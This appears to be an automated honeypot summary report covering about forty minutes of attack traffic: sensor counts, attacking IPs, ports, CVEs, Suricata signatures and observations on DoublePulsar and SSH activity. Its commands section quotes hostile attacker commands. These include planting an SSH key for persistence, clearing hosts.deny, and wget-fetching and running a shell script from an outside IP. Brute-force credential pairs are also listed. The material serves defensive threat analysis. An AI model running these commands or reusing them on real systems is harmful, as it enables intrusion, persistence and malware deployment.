Honeypot Attack Summary Report

Report generated on 2025-10-05T11:01:33Z.
Data aggregated from the following files, covering the period from 2025-10-05T10:20:01Z to 2025-10-05T11:00:01Z:
- agg_log_20251005T102001Z.json
- agg_log_20251005T104002Z.json
- agg_log_20251005T110001Z.json

Executive Summary

This report summarizes 13,646 events collected from the honeypot network. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute-force attacks and command execution attempts. Suricata alerts also contributed a significant portion of the events, with a large number of alerts related to the DoublePulsar backdoor. A wide range of reconnaissance and exploitation activities were observed from numerous IP addresses, with a notable concentration of attacks targeting SMB (TCP/445) and SSH (TCP/22) services.

Detailed Analysis

Attacks by Honeypot:
- Cowrie: 7038
- Suricata: 3265
- Ciscoasa: 1423
- Mailoney: 807
- Honeytrap: 549
- Sentrypeer: 250
- Miniprint: 70
- Dionaea: 65
- Adbhoney: 38
- H0neytr4p: 44
- Honeyaml: 36
- Redishoneypot: 22
- ElasticPot: 15
- Tanner: 20
- ConPot: 4

Top Attacking IPs:
- 154.180.235.124
- 159.223.50.114
- 198.186.131.155
- 176.65.141.117
- 92.51.75.246
- 57.129.70.232
- 148.113.15.67
- 104.168.35.231
- 95.167.225.76
- 206.189.152.59

Top Targeted Ports/Protocols:
- TCP/445
- 22
- 25
- 5060
- UDP/5060
- TCP/5900
- 9100
- 9092
- 6379
- TCP/80

Most Common CVEs:
- CVE-2005-4050
- CVE-2022-27255
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2021-3449
- CVE-2019-11500
- CVE-2006-2369
- CVE-2021-35394

Commands Attempted by Attackers:
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- uname -m
- whoami
- Enter new UNIX password:
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
- cd /data/local/tmp/; busybox wget http://151.242.30.16/w.sh; sh w.sh; ...

Signatures Triggered:
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET VOIP MultiTech SIP UDP Overflow
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- ET INFO Reserved Internal IP Traffic
- ET SCAN Potential SSH Scan
- ET CINS Active Threat Intelligence Poor Reputation IP group 48
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow Attempt Inbound (CVE-2022-27255)

Users / Login Attempts:
- 345gs5662d34/345gs5662d34
- root/nPSpP4PBW0
- test/zhbjETuyMffoL8F
- root/3245gs5662d34
- root/2glehe5t24th1issZs
- root/LeitboGi0ro
- novinhost/novinhost.org
- test/3245gs5662d34
- hadoop/hadoop
- build/build123

Files Uploaded/Downloaded:
- wget.sh;
- w.sh;
- c.sh;
- catgirls;

HTTP User-Agents:
- N/A

SSH Clients:
- N/A

SSH Servers:
- N/A

Top Attacker AS Organizations:
- N/A

Key Observations and Anomalies

- A significant number of events (1,872) are related to the DoublePulsar backdoor, suggesting attempts to exploit the EternalBlue vulnerability.
- The most common commands executed by attackers involve manipulating SSH authorized_keys files, indicating attempts to establish persistent access.
- Attackers frequently use system reconnaissance commands (e.g., `lscpu`, `uname`, `free`) to gather information about the compromised system.
- There is a noticeable amount of scanning activity for vulnerabilities in VoIP systems (SIP protocol), as evidenced by the "ET VOIP MultiTech SIP UDP Overflow" signature.
- Multiple attackers attempted to download and execute shell scripts (`w.sh`, `c.sh`, `wget.sh`) from various IP addresses, a common tactic for deploying malware or botnet clients.

This concludes the Honeypot Attack Summary Report.
